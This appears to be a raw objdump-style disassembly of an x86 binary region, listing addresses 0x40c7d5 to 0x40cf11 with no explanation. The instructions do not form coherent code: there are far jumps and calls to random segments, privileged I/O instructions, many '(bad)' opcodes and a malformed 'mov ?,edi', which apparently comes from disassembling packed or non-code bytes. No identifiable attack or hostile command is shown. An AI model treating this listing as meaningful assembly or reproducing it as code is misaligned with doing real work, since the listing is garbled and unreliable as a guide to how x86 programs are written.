  40c7d5:	fstp   DWORD PTR [edx]
  40c7d7:	adc    esp,DWORD PTR [edx]
  40c7d9:	lea    ecx,[ebp-0x18]
  40c7dc:	jge    0x40c7c8
  40c7de:	std    
  40c7df:	out    dx,eax
  40c7e0:	ret    0xc8f7
  40c7e3:	mov    cl,0x15
  40c7e5:	or     eax,0x5ba4c746
  40c7ea:	lods   al,BYTE PTR ds:[esi]
  40c7eb:	popa   
  40c7ec:	shl    dh,cl
  40c7ee:	mov    ecx,0x4716c14f
  40c7f3:	add    eax,0xb14f7633
  40c7f8:	mov    cs,esi
  40c7fa:	jl     0x40c865
  40c7fc:	xchg   esp,eax
  40c7fd:	mov    eax,ds:0x2f04d240
  40c802:	hlt    
  40c803:	mov    al,0x88
  40c805:	aaa    
  40c806:	mov    al,ds:0x495a5c0f
  40c80b:	cmp    DWORD PTR [esi+0x70a177a6],edi
  40c811:	xchg   ebx,edi
  40c813:	test   eax,0x5039097
  40c818:	inc    ebx
  40c819:	cmp    al,0x5a
  40c81b:	ret    
  40c81c:	cli    
  40c81d:	add    al,0x42
  40c81f:	mov    DWORD PTR ds:0xc32b3c24,ecx
  40c825:	sbb    al,0x85
  40c827:	jne    0x40c7ce
  40c829:	mov    dh,0xd0
  40c82b:	sub    al,0xdb
  40c82d:	xchg   edx,eax
  40c82e:	jno    0x40c809
  40c830:	sahf   
  40c831:	into   
  40c832:	add    BYTE PTR [esi+0x4e],cl
  40c835:	cli    
  40c836:	fnstenv [edi-0x29741eb5]
  40c83c:	fcmovb st,st(7)
  40c83e:	sub    bh,BYTE PTR [eax-0x3a102e48]
  40c844:	std    
  40c845:	out    dx,eax
  40c846:	cdq    
  40c847:	or     BYTE PTR [ebx-0x3f],0x8d
  40c84b:	add    al,BYTE PTR [edi+0x45]
  40c84e:	nop
  40c84f:	pop    edi
  40c850:	out    0x26,al
  40c852:	adc    DWORD PTR [ebp-0x2d],edi
  40c855:	(bad)  
  40c856:	and    eax,0xc5a32267
  40c85b:	mov    eax,0x64317a71
  40c860:	mov    esi,0x63d4cee9
  40c865:	das    
  40c866:	aam    0x14
  40c868:	dec    esp
  40c869:	(bad)  
  40c86a:	out    dx,eax
  40c86b:	xchg   esi,eax
  40c86c:	and    ebx,eax
  40c86e:	push   0x62
  40c870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c871:	cmc    
  40c872:	xchg   ebx,eax
  40c873:	loope  0x40c8f3
  40c875:	jmp    0x8ed6:0xf955f0d2
  40c87c:	mov    edi,0x93f264ba
  40c881:	das    
  40c882:	mov    esi,DWORD PTR [ebx]
  40c884:	lods   eax,DWORD PTR ds:[esi]
  40c885:	fcomip st,st(1)
  40c887:	mov    BYTE PTR [esi],al
  40c889:	jb     0x40c8ea
  40c88b:	push   esi
  40c88c:	pop    esi
  40c88d:	repz cdq 
  40c88f:	mov    ecx,0xf0107f03
  40c894:	mov    al,ds:0x4e26a65d
  40c899:	das    
  40c89a:	jecxz  0x40c85e
  40c89c:	into   
  40c89d:	mov    ah,0x34
  40c89f:	or     al,BYTE PTR [esi]
  40c8a1:	adc    dh,BYTE PTR [esi-0x2a26c9ee]
  40c8a7:	mov    edi,0x22b0421d
  40c8ac:	(bad)  
  40c8ad:	stc    
  40c8ae:	pop    eax
  40c8af:	pop    edi
  40c8b0:	inc    ebx
  40c8b1:	nop
  40c8b2:	adc    ebp,eax
  40c8b4:	sbb    ah,0xb2
  40c8b7:	xor    al,0xd3
  40c8b9:	push   esp
  40c8ba:	mov    eax,ds:0x3749ce10
  40c8bf:	daa    
  40c8c0:	push   esp
  40c8c1:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8c3:	cli    
  40c8c4:	retf   
  40c8c5:	out    dx,al
  40c8c6:	stos   BYTE PTR es:[edi],al
  40c8c7:	popa   
  40c8c8:	call   0xdac9:0x56854f3a
  40c8cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8d0:	daa    
  40c8d1:	cmp    edx,DWORD PTR [edx]
  40c8d3:	add    dh,bh
  40c8d5:	fs into 
  40c8d7:	mov    bh,0xbf
  40c8d9:	dec    ecx
  40c8da:	mov    BYTE PTR [ebx+0x6b2cd2f0],ch
  40c8e0:	mov    ecx,0xdc335ab5
  40c8e5:	call   0x5e5:0xb1be0f2d
  40c8ec:	sahf   
  40c8ed:	push   edi
  40c8ee:	scas   eax,DWORD PTR es:[edi]
  40c8ef:	dec    eax
  40c8f0:	addr16 (bad) 
  40c8f2:	fild   WORD PTR ds:0x60a06e99
  40c8f8:	sub    eax,esp
  40c8fa:	mov    bh,0x8d
  40c8fc:	dec    esp
  40c8fd:	push   ebp
  40c8fe:	sub    al,0x74
  40c900:	pop    ds
  40c901:	jnp    0x40c8b8
  40c903:	shr    DWORD PTR [edi],1
  40c905:	inc    edi
  40c906:	mov    al,0x9
  40c908:	imul   ebx,DWORD PTR [ebp+0x32e062dc],0xcfee578e
  40c912:	out    0x1d,al
  40c914:	test   eax,0x11bbd288
  40c919:	jmp    0x670f88a8
  40c91e:	cld    
  40c91f:	ficomp WORD PTR [ebp-0x7f7dbb97]
  40c925:	out    dx,eax
  40c926:	nop
  40c927:	cwde   
  40c928:	aaa    
  40c929:	or     esi,edx
  40c92b:	jg     0x40c96c
  40c92d:	pushf  
  40c92e:	add    eax,0x2f859353
  40c933:	mov    dh,0x78
  40c935:	int    0xa0
  40c937:	sbb    esi,DWORD PTR [esi-0x6c29799f]
  40c93d:	test   al,0xec
  40c93f:	pop    ebx
  40c940:	stos   BYTE PTR es:[edi],al
  40c941:	stos   DWORD PTR es:[edi],eax
  40c942:	ja     0x40c990
  40c944:	or     dl,BYTE PTR [edi-0x4e744f1d]
  40c94a:	sub    BYTE PTR [ecx],al
  40c94c:	test   DWORD PTR [ebx+edx*1],edx
  40c94f:	xchg   ebp,eax
  40c950:	or     eax,eax
  40c952:	xchg   edx,eax
  40c953:	mov    edx,0xc9206bab
  40c958:	jbe    0x40c934
  40c95a:	inc    ebx
  40c95b:	inc    esp
  40c95c:	push   ecx
  40c95d:	add    DWORD PTR [edi+0x56],edi
  40c960:	neg    esi
  40c962:	mov    DWORD PTR [ecx+0xef9d6ac],esi
  40c968:	mov    ds:0x4e52cae7,eax
  40c96d:	mov    ds:0xa1a12e61,al
  40c972:	sbb    DWORD PTR [edx],edx
  40c974:	outs   dx,DWORD PTR ds:[esi]
  40c975:	ss adc al,0xb4
  40c978:	fcom   st(2)
  40c97a:	xor    DWORD PTR [eax+0x451e5c53],eax
  40c980:	mov    al,BYTE PTR [edi-0xae7a9a6]
  40c986:	(bad)  
  40c987:	xor    edi,ecx
  40c989:	retf   
  40c98a:	xor    edx,DWORD PTR [ecx]
  40c98c:	dec    eax
  40c98d:	popf   
  40c98e:	inc    edi
  40c98f:	es jmp 0xb8e9:0x246b0e41
  40c997:	pusha  
  40c998:	jb     0x40c961
  40c99a:	outs   dx,BYTE PTR ds:[esi]
  40c99b:	adc    DWORD PTR [ebx+0x7e77a156],ebx
  40c9a1:	aas    
  40c9a2:	repz adc BYTE PTR [bx+di-0x37f],dl
  40c9a8:	push   0xffffffb3
  40c9aa:	add    eax,0x55b271bb
  40c9af:	pop    esp
  40c9b0:	sub    edi,DWORD PTR [ecx-0x1a]
  40c9b3:	push   ecx
  40c9b4:	or     BYTE PTR [ecx-0x76],al
  40c9b7:	lods   al,BYTE PTR ds:[esi]
  40c9b8:	and    BYTE PTR [ebp-0x6dd59332],bh
  40c9be:	xchg   ebp,eax
  40c9bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c0:	sub    dh,BYTE PTR [ebx+eax*4]
  40c9c3:	ins    DWORD PTR es:[edi],dx
  40c9c4:	xor    al,0xdb
  40c9c6:	out    0x35,eax
  40c9c8:	icebp  
  40c9c9:	cmc    
  40c9ca:	jo     0x40c9a3
  40c9cc:	inc    eax
  40c9cd:	sbb    al,0xd2
  40c9cf:	xor    eax,0xd254d213
  40c9d4:	jp     0x40ca52
  40c9d6:	sbb    al,0x97
  40c9d8:	adc    ecx,ebx
  40c9da:	jae    0x40c9c2
  40c9dc:	cmp    al,0x9b
  40c9de:	iret   
  40c9df:	mov    cs,WORD PTR [edi]
  40c9e1:	xor    DWORD PTR [ecx+ebp*1+0x226cef3],ecx
  40c9e8:	inc    ebx
  40c9e9:	inc    edx
  40c9ea:	pop    esp
  40c9eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ed:	xchg   ebp,eax
  40c9ee:	pushf  
  40c9ef:	sbb    eax,0xb5a6d60
  40c9f4:	js     0x40c9cb
  40c9f6:	fistp  WORD PTR [ebx-0x1e53e2d6]
  40c9fc:	jae    0x40c983
  40c9fe:	or     BYTE PTR [ebx+edi*4+0x14],ah
  40ca02:	mov    WORD PTR [ebp*8+0x46c2469e],cs
  40ca09:	pop    edx
  40ca0a:	jno    0x40ca3c
  40ca0c:	aam    0xc9
  40ca0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca0f:	push   0x7bad2f87
  40ca14:	test   al,0xa
  40ca16:	add    dh,dl
  40ca18:	loope  0x40c9da
  40ca1a:	not    DWORD PTR [edx+0x73]
  40ca1d:	imul   BYTE PTR [ecx-0x18d7dd15]
  40ca23:	and    eax,0x8bf767b2
  40ca28:	leave  
  40ca29:	ins    BYTE PTR es:[edi],dx
  40ca2a:	mov    ecx,ecx
  40ca2c:	shr    DWORD PTR [edx],1
  40ca2e:	mov    ?,edi
  40ca30:	lahf   
  40ca31:	inc    ecx
  40ca32:	xchg   ebp,eax
  40ca33:	xchg   ecx,eax
  40ca34:	sub    al,0x93
  40ca36:	(bad)  
  40ca37:	pop    esp
  40ca39:	cld    
  40ca3a:	mov    DWORD PTR [ecx*8-0x4f99b900],ebp
  40ca41:	jmp    0x1fb2e1c6
  40ca46:	call   0x27c377b
  40ca4b:	xchg   ebx,eax
  40ca4c:	push   edx
  40ca4d:	imul   ebp,ebx,0x6f
  40ca50:	adc    DWORD PTR [ecx],0xffffff86
  40ca53:	ficom  WORD PTR [eax-0x1698b39e]
  40ca59:	dec    DWORD PTR [esi]
  40ca5b:	and    DWORD PTR [eax-0x7c9d1bb9],edi
  40ca61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca62:	stos   BYTE PTR es:[edi],al
  40ca63:	sub    BYTE PTR [ebx],dh
  40ca65:	mov    bl,BYTE PTR [ebp-0x71]
  40ca68:	add    DWORD PTR [ebp-0x5dd92030],esp
  40ca6e:	test   BYTE PTR [eax+0x6889fed3],al
  40ca74:	dec    ebp
  40ca75:	add    eax,0xc84908db
  40ca7a:	add    edi,DWORD PTR [ecx]
  40ca7c:	pushf  
  40ca7d:	add    eax,0xbdd5dfb9
  40ca82:	push   ds
  40ca83:	in     al,dx
  40ca84:	dec    esi
  40ca85:	mov    ebx,esp
  40ca87:	jge    0x40caaa
  40ca89:	or     BYTE PTR [eax-0x1f139d64],cl
  40ca8f:	or     ch,BYTE PTR [ecx-0x4e]
  40ca92:	pop    edx
  40ca93:	mov    eax,ds:0x8df648b3
  40ca98:	adc    BYTE PTR [ebx-0x2f],dl
  40ca9b:	xchg   edi,eax
  40ca9c:	popa   
  40ca9d:	jns    0x40caa3
  40ca9f:	pushf  
  40caa0:	rcl    BYTE PTR [ebp-0x76eedeff],cl
  40caa6:	int3   
  40caa7:	pop    es
  40caa8:	scas   al,BYTE PTR es:[edi]
  40caa9:	out    0x79,al
  40caab:	(bad)  
  40caac:	cmp    cl,BYTE PTR [eax+0x7c66805b]
  40cab2:	or     eax,0x44f9f4d3
  40cab7:	xchg   ch,bh
  40cab9:	add    BYTE PTR [eax+edi*8],al
  40cabc:	jmp    0xa354:0x5f0b0feb
  40cac3:	inc    ecx
  40cac4:	cdq    
  40cac5:	dec    esp
  40cac6:	test   DWORD PTR [ecx],ebx
  40cac8:	pop    ebp
  40cac9:	inc    dx
  40cacb:	bound  ebx,QWORD PTR [esi-0x14]
  40cace:	or     ch,BYTE PTR [esi]
  40cad0:	push   es
  40cad1:	dec    edi
  40cad2:	icebp  
  40cad3:	pusha  
  40cad4:	sub    al,0xb4
  40cad6:	push   edx
  40cad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cad8:	dec    ebp
  40cad9:	push   ebx
  40cada:	ins    DWORD PTR es:[edi],dx
  40cadb:	mov    edi,0x19262b50
  40cae0:	inc    esi
  40cae1:	jmp    0x7e6c:0xad89592d
  40cae8:	fnstenv [eax+ebx*2]
  40caeb:	fnstenv [eax]
  40caed:	ror    BYTE PTR [eax-0x48f5eca8],1
  40caf3:	dec    esp
  40caf4:	repnz push ebx
  40caf6:	push   esp
  40caf7:	sub    BYTE PTR [ecx-0x3a],ch
  40cafa:	add    al,0xdd
  40cafc:	outs   dx,BYTE PTR ds:[esi]
  40cafd:	loop   0x40cb62
  40caff:	and    BYTE PTR [ebp-0x51],0xfa
  40cb03:	sub    bh,al
  40cb05:	pop    ebp
  40cb06:	add    al,0xa
  40cb08:	and    ebp,ecx
  40cb0a:	shl    dh,0x88
  40cb0d:	popa   
  40cb0e:	and    edi,esi
  40cb10:	sbb    dl,ah
  40cb12:	jmp    0x1ceb:0xc7de7855
  40cb19:	push   0xffffffa6
  40cb1b:	stc    
  40cb1c:	push   esi
  40cb1d:	inc    ecx
  40cb1e:	out    0xc4,eax
  40cb20:	add    DWORD PTR [esi+eiz*2-0x37a40f21],ebx
  40cb27:	loopne 0x40cb5b
  40cb29:	jnp    0x40cad0
  40cb2b:	and    esp,DWORD PTR [esi+0x7a]
  40cb2e:	fsubr  QWORD PTR [ebx+0x66c032af]
  40cb34:	mov    ch,0xe7
  40cb36:	rol    BYTE PTR [ecx-0x6c],1
  40cb39:	mov    edi,0xa5e776f7
  40cb3e:	stos   DWORD PTR es:[edi],eax
  40cb3f:	jae    0x40cb7b
  40cb41:	mov    ah,0xe8
  40cb43:	rcl    edi,1
  40cb45:	xor    DWORD PTR [eax-0x43],ebx
  40cb48:	aaa    
  40cb49:	cdq    
  40cb4a:	mov    ds:0x79c115e5,al
  40cb4f:	pop    ecx
  40cb50:	out    dx,al
  40cb51:	ins    DWORD PTR es:[edi],dx
  40cb52:	cmp    al,0xcd
  40cb54:	pop    ebx
  40cb55:	mov    dl,0x29
  40cb57:	fdiv   DWORD PTR [ebp+0x4d3caf89]
  40cb5d:	mov    ds:0x7f9f58be,al
  40cb62:	pop    edx
  40cb63:	mov    ds:0x734a0819,eax
  40cb68:	daa    
  40cb69:	popf   
  40cb6a:	fcomp  QWORD PTR [ebx]
  40cb6c:	inc    ebx
  40cb6d:	mov    BYTE PTR [ecx+0xaa7d444],cl
  40cb73:	lea    edx,[esi+0x1e]
  40cb76:	jo     0x40cb0c
  40cb78:	xor    edx,DWORD PTR [esi-0x7b17ca03]
  40cb7e:	aam    0x5e
  40cb80:	lahf   
  40cb81:	mov    DWORD PTR [eax-0x17dd5862],edi
  40cb87:	jmp    0x7d7:0xd4995da9
  40cb8e:	call   FWORD PTR [ecx-0x5a]
  40cb91:	sbb    DWORD PTR [edx+0x28],edx
  40cb94:	inc    esp
  40cb95:	push   ebp
  40cb96:	inc    edi
  40cb97:	push   edi
  40cb98:	and    eax,0x1066eca3
  40cb9d:	loope  0x40cb40
  40cb9f:	mov    bh,0xae
  40cba1:	mov    eax,0xee7e5176
  40cba6:	jl     0x40cb64
  40cba8:	cmp    eax,0x24ea5d57
  40cbad:	repnz adc al,0xcb
  40cbb0:	stos   DWORD PTR es:[edi],eax
  40cbb1:	(bad)  
  40cbb2:	daa    
  40cbb3:	xchg   esp,eax
  40cbb4:	out    dx,al
  40cbb5:	fidiv  WORD PTR [edx+ebx*4+0x13130aee]
  40cbbc:	sub    esi,ebx
  40cbbe:	cmp    eax,0xe295190b
  40cbc3:	or     ebx,DWORD PTR ds:0xa850ea4
  40cbc9:	sbb    cl,BYTE PTR [ecx-0x39633e]
  40cbcf:	push   esp
  40cbd0:	push   0xffffff98
  40cbd2:	jecxz  0x40cb60
  40cbd4:	fbstp  TBYTE PTR [esi+0x6524f49]
  40cbda:	jle    0x40cb74
  40cbdc:	call   0xf2aa7575
  40cbe1:	dec    ebx
  40cbe2:	stc    
  40cbe3:	and    DWORD PTR [ebx+0x232c0f34],edx
  40cbe9:	(bad)  
  40cbea:	loop   0x40cbf4
  40cbec:	pop    edi
  40cbed:	mov    ebx,0xe94b6f8a
  40cbf2:	icebp  
  40cbf3:	mov    cl,0xe
  40cbf5:	xor    ch,BYTE PTR [esi]
  40cbf7:	loope  0x40cc37
  40cbf9:	and    ch,BYTE PTR [edi-0x10]
  40cbfc:	xor    al,0xb6
  40cbfe:	popf   
  40cbff:	pop    es
  40cc00:	retf   
  40cc01:	neg    BYTE PTR [eax+0x54]
  40cc04:	fst    DWORD PTR [esi+0x6610c40]
  40cc0a:	xchg   edi,eax
  40cc0b:	mov    ch,0x73
  40cc0d:	dec    ebx
  40cc0e:	dec    ecx
  40cc0f:	lods   al,BYTE PTR ds:[esi]
  40cc10:	mov    ch,0x93
  40cc12:	or     BYTE PTR [esi-0x7a],ah
  40cc15:	dec    ebp
  40cc16:	in     eax,dx
  40cc17:	mov    al,0xb4
  40cc19:	jp     0x40cc64
  40cc1b:	add    DWORD PTR [ebx+0x59],esp
  40cc1e:	daa    
  40cc1f:	mov    edi,0x2c36e8ae
  40cc24:	div    bl
  40cc26:	jnp    0x40cc37
  40cc28:	inc    eax
  40cc29:	xchg   ebx,eax
  40cc2a:	adc    al,0x2f
  40cc2c:	fild   WORD PTR [edx]
  40cc2e:	retf   
  40cc2f:	movhps QWORD PTR [ebp-0x599989fb],xmm4
  40cc36:	retf   0x98cd
  40cc39:	add    al,BYTE PTR [edi]
  40cc3b:	(bad)  
  40cc3c:	mov    DWORD PTR [edi],esi
  40cc3e:	fnstenvw [eax-0xd]
  40cc42:	pop    ecx
  40cc43:	je     0x40cbe6
  40cc45:	test   al,0xef
  40cc47:	add    al,0x0
  40cc49:	jle    0x40cc9f
  40cc4b:	loopne 0x40cc1e
  40cc4d:	shl    DWORD PTR [ecx+0x159a21a3],1
  40cc53:	mov    bh,0x89
  40cc55:	jp     0x40cc66
  40cc57:	popa   
  40cc58:	stc    
  40cc59:	adc    eax,0x9c594c23
  40cc5e:	pusha  
  40cc5f:	add    BYTE PTR [esp+edx*1-0x554bba87],ch
  40cc66:	jg     0x40cc83
  40cc68:	and    al,0x47
  40cc6a:	mov    dh,0xb8
  40cc6c:	aam    0x5c
  40cc6e:	shl    BYTE PTR [esi],0x25
  40cc71:	fwait
  40cc72:	and    al,BYTE PTR [eax-0x24534ab1]
  40cc78:	xor    ch,BYTE PTR [ebx]
  40cc7a:	inc    ebx
  40cc7b:	or     esi,ebx
  40cc7d:	sub    edi,DWORD PTR [edx+0x13]
  40cc80:	add    ecx,ecx
  40cc82:	aas    
  40cc83:	jbe    0x40ccc0
  40cc85:	cmp    eax,0xce7457dd
  40cc8a:	xchg   ecx,eax
  40cc8b:	or     edi,DWORD PTR [eax-0x4a2e5d34]
  40cc91:	xchg   edx,ecx
  40cc93:	pop    es
  40cc94:	mov    ds,WORD PTR [eax-0x52ad3a28]
  40cc9a:	cdq    
  40cc9b:	jno    0x40ccc1
  40cc9d:	imul   DWORD PTR [esi-0x6a]
  40cca0:	cmp    DWORD PTR [eax],0xb6fd1ecd
  40cca6:	imul   DWORD PTR [ecx+0x56]
  40cca9:	mov    bl,0xfb
  40ccab:	mov    ebx,esi
  40ccad:	loop   0x40cd2e
  40ccaf:	pop    ebp
  40ccb0:	add    dh,al
  40ccb2:	fucomip st,st(5)
  40ccb4:	cmp    bl,al
  40ccb6:	sub    DWORD PTR [eax],edx
  40ccb8:	and    ebp,DWORD PTR [esi+0x75]
  40ccbb:	xchg   esi,eax
  40ccbc:	and    bh,BYTE PTR [ebx-0x3c5fde3f]
  40ccc2:	das    
  40ccc3:	out    0x17,al
  40ccc5:	aad    0x96
  40ccc7:	mov    bl,ch
  40ccc9:	int3   
  40ccca:	fisttp QWORD PTR [edx-0x2ea371b2]
  40ccd0:	fs jmp 0xd50f1251
  40ccd6:	push   ecx
  40ccd7:	pushf  
  40ccd8:	dec    ebp
  40ccd9:	mov    ah,bl
  40ccdb:	or     al,0x56
  40ccdd:	pop    es
  40ccde:	je     0x40ccb6
  40cce0:	iret   
  40cce1:	out    dx,eax
  40cce2:	jns    0x40cd4d
  40cce4:	(bad)  
  40cce5:	(bad)  
  40cce6:	ficom  WORD PTR [edx*4+0x31924745]
  40cced:	push   cs
  40ccee:	aam    0xb6
  40ccf0:	mov    bl,0xef
  40ccf2:	and    al,0x9e
  40ccf4:	loop   0x40cceb
  40ccf6:	loopne 0x40ccd6
  40ccf8:	and    BYTE PTR [ecx+0x71],dh
  40ccfb:	mov    cl,0xc4
  40ccfd:	mov    ecx,0x6950f561
  40cd02:	lods   al,BYTE PTR ds:[esi]
  40cd03:	leave  
  40cd04:	pop    es
  40cd05:	call   0xf616:0xf64d7fc8
  40cd0c:	jnp    0x40cd23
  40cd0e:	cmp    dl,0x68
  40cd11:	mov    ecx,0xc8d4d3dc
  40cd16:	add    DWORD PTR [edi+esi*8],esi
  40cd19:	fisttp DWORD PTR es:[eax-0x62]
  40cd1d:	pushf  
  40cd1e:	mov    al,ds:0xf5580e57
  40cd23:	or     DWORD PTR [edx-0x6aeb90e3],ebx
  40cd29:	enter  0x4c38,0xae
  40cd2d:	or     eax,0xf55feaad
  40cd32:	popa   
  40cd33:	call   0xb0f7:0x1f4a0dd7
  40cd3a:	mov    eax,ds:0x876d53e3
  40cd3f:	jmp    0x40cda4
  40cd41:	adc    eax,0x25488629
  40cd46:	jae    0x40cd7c
  40cd48:	stos   DWORD PTR es:[edi],eax
  40cd49:	sbb    eax,0xd8b690e3
  40cd4e:	ins    BYTE PTR es:[edi],dx
  40cd4f:	add    DWORD PTR [esi+0x66],esp
  40cd52:	js     0x40cd5f
  40cd54:	push   eax
  40cd55:	pop    ss
  40cd56:	jl     0x40cd49
  40cd58:	add    al,0xd1
  40cd5a:	std    
  40cd5b:	std    
  40cd5c:	xlat   BYTE PTR ds:[ebx]
  40cd5d:	scas   al,BYTE PTR es:[edi]
  40cd5e:	stos   BYTE PTR es:[edi],al
  40cd5f:	je     0x40cd20
  40cd61:	out    dx,al
  40cd62:	or     bh,BYTE PTR [eax]
  40cd64:	jb     0x40cd37
  40cd66:	pop    ebx
  40cd67:	in     al,0x30
  40cd69:	retf   
  40cd6a:	and    esp,DWORD PTR [ebp-0x3e]
  40cd6d:	(bad)  
  40cd6e:	int    0xf4
  40cd70:	add    ebx,DWORD PTR [edx+0x4c993e9]
  40cd76:	sub    BYTE PTR [edx-0x6ad73a3a],ch
  40cd7c:	cmp    esp,DWORD PTR [ecx+0x28]
  40cd7f:	push   eax
  40cd80:	xor    DWORD PTR [ebx+0x1a4336d3],0x1
  40cd87:	jbe    0x40cdb0
  40cd89:	pop    esi
  40cd8a:	sub    DWORD PTR [ebx-0x6794df70],0x51
  40cd91:	cmp    eax,0xc3a0c8f8
  40cd96:	jl     0x40cd9e
  40cd98:	pusha  
  40cd99:	mov    al,0xe7
  40cd9b:	inc    ebp
  40cd9c:	xor    eax,DWORD PTR [ebx+0xe07c883]
  40cda2:	jmp    0x813c:0xfb972552
  40cda9:	sbb    dh,BYTE PTR [ecx]
  40cdab:	ins    DWORD PTR es:[edi],dx
  40cdac:	pop    ecx
  40cdad:	mov    ecx,0xd2b90ff0
  40cdb2:	pop    ss
  40cdb3:	rcr    BYTE PTR [ebp+0x79],1
  40cdb6:	mov    al,al
  40cdb8:	sub    al,al
  40cdba:	dec    ebp
  40cdbb:	ja     0x40cd92
  40cdbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdbe:	sub    al,0x45
  40cdc0:	adc    esi,esp
  40cdc2:	pop    ss
  40cdc3:	pop    ebx
  40cdc4:	(bad)  
  40cdc5:	xchg   ebx,eax
  40cdc6:	in     al,dx
  40cdc7:	lds    eax,FWORD PTR [edx]
  40cdc9:	outs   dx,BYTE PTR ds:[esi]
  40cdca:	pop    esp
  40cdcb:	int3   
  40cdcc:	push   esi
  40cdcd:	pop    es
  40cdce:	test   al,0x40
  40cdd0:	push   ebx
  40cdd1:	push   cs
  40cdd2:	pop    esp
  40cdd3:	mov    edi,0xa888447b
  40cdd8:	dec    ebx
  40cdd9:	pop    esi
  40cdda:	stc    
  40cddb:	fldenv [esi]
  40cddd:	add    edi,eax
  40cddf:	sub    ebp,edx
  40cde1:	mov    eax,cs:0xc55ea3b8
  40cde7:	push   ebx
  40cde8:	pop    ecx
  40cde9:	xchg   esp,eax
  40cdea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdeb:	xchg   esp,eax
  40cdec:	call   0x25f8:0x9a99ba49
  40cdf3:	nop
  40cdf4:	jl     0x40cda5
  40cdf6:	imul   ecx,DWORD PTR [eax],0xffffffa6
  40cdf9:	mov    ebp,0x5f3750b7
  40cdfe:	sub    BYTE PTR [ebp-0x6d91ad6f],0x1f
  40ce05:	jbe    0x40cd91
  40ce07:	jbe    0x40ce19
  40ce09:	repz and BYTE PTR [esi+ebp*2],ah
  40ce0d:	mov    ebp,0xa25d9409
  40ce12:	jns    0x40cdac
  40ce14:	sub    DWORD PTR [ecx-0x30bb98aa],edi
  40ce1a:	xchg   ecx,eax
  40ce1b:	mov    bh,BYTE PTR [eax+esi*8-0x66]
  40ce1f:	jg     0x40ce73
  40ce21:	cmp    edi,DWORD PTR [eax-0x79ff3b56]
  40ce27:	mov    al,0x8b
  40ce29:	mov    BYTE PTR ds:0xf9abbe38,dh
  40ce2f:	rcr    BYTE PTR [eax-0x59],cl
  40ce32:	cs out dx,al
  40ce34:	rol    BYTE PTR [eax+0x68b475a8],1
  40ce3a:	ficomp WORD PTR [ebx+0x48dd9a64]
  40ce40:	pop    ecx
  40ce41:	mov    ebx,0xfc9ed205
  40ce46:	add    cl,BYTE PTR [edi]
  40ce48:	shl    dh,1
  40ce4a:	cdq    
  40ce4b:	addr16 cli 
  40ce4d:	repz ret 0x266a
  40ce51:	mov    esp,0xe8d13bd
  40ce56:	hlt    
  40ce57:	out    0xf3,eax
  40ce59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce5a:	std    
  40ce5b:	xor    BYTE PTR [ebx+0x3c7ba2f6],dh
  40ce61:	jae    0x40ce99
  40ce63:	lahf   
  40ce64:	push   ss
  40ce65:	stos   BYTE PTR es:[edi],al
  40ce66:	dec    esi
  40ce67:	inc    ebp
  40ce68:	test   edi,esp
  40ce6a:	jle    0x40cdfd
  40ce6c:	cli    
  40ce6d:	retf   
  40ce6e:	out    dx,al
  40ce6f:	jbe    0x40ce37
  40ce71:	lea    eax,[ebp*8+0x33821b15]
  40ce78:	push   ebp
  40ce79:	fdivr  DWORD PTR [edx+eiz*2-0x2e]
  40ce7d:	sub    eax,DWORD PTR [eax]
  40ce7f:	adc    DWORD PTR [esi+0x79],edx
  40ce82:	push   ebx
  40ce83:	and    edi,DWORD PTR [eax+0x5cfe82c8]
  40ce89:	pop    esp
  40ce8a:	push   esi
  40ce8b:	not    DWORD PTR [edx]
  40ce8d:	push   ds
  40ce8e:	or     DWORD PTR [esi-0x62],esp
  40ce91:	jecxz  0x40ceda
  40ce93:	push   esi
  40ce94:	scas   al,BYTE PTR es:[edi]
  40ce95:	pop    ecx
  40ce96:	fsubrp st(3),st
  40ce98:	add    al,0xf6
  40ce9a:	arpl   WORD PTR fs:[eax+0x57],bp
  40ce9e:	in     al,0x3b
  40cea0:	out    dx,al
  40cea1:	xchg   esi,eax
  40cea2:	pusha  
  40cea3:	jbe    0x40cf1f
  40cea5:	jno    0x40cf09
  40cea7:	rcl    BYTE PTR [ebx+0x12],cl
  40ceaa:	test   eax,0xcfa6c4be
  40ceaf:	xor    cl,BYTE PTR [ebp+0x6015767e]
  40ceb5:	ins    BYTE PTR es:[edi],dx
  40ceb6:	push   eax
  40ceb7:	jno    0x40ce7a
  40ceb9:	retf   
  40ceba:	add    eax,0x9f86e345
  40cebf:	lahf   
  40cec0:	dec    edx
  40cec1:	jo     0x40cf24
  40cec3:	push   0xffffffa1
  40cec5:	inc    edx
  40cec6:	retf   0x55a3
  40cec9:	aas    
  40ceca:	push   edi
  40cecb:	or     eax,edi
  40cecd:	push   cs
  40cece:	scas   eax,DWORD PTR es:[edi]
  40cecf:	test   BYTE PTR [esi],0x8b
  40ced2:	pop    edx
  40ced3:	(bad)  
  40ced4:	retf   0x8a92
  40ced7:	int    0xa3
  40ced9:	jno    0x40cedf
  40cedb:	ins    BYTE PTR es:[edi],dx
  40cedc:	addr16 add al,0x1
  40cedf:	dec    edi
  40cee0:	xchg   ecx,eax
  40cee1:	xor    BYTE PTR [esi-0x1697919f],bh
  40cee7:	jmp    0x40ce6d
  40cee9:	xor    al,0x56
  40ceeb:	xor    BYTE PTR [esi-0x80],ch
  40ceee:	adc    al,0x24
  40cef0:	out    dx,eax
  40cef1:	jge    0x40cec3
  40cef3:	jmp    0x40cefa
  40cef5:	aas    
  40cef6:	out    dx,al
  40cef7:	jecxz  0x40cea4
  40cef9:	ja     0x40cf12
  40cefb:	test   BYTE PTR ds:0xf3af899,dl
  40cf01:	sbb    ecx,esi
  40cf03:	sub    al,0xac
  40cf05:	cmp    edx,DWORD PTR [eax+0x10]
  40cf08:	test   al,0xfb
  40cf0a:	xor    cl,dl
  40cf0c:	add    eax,0xae56bc87
  40cf11:	xchg   DWORD PTR ds:0xddfa91cc,edx
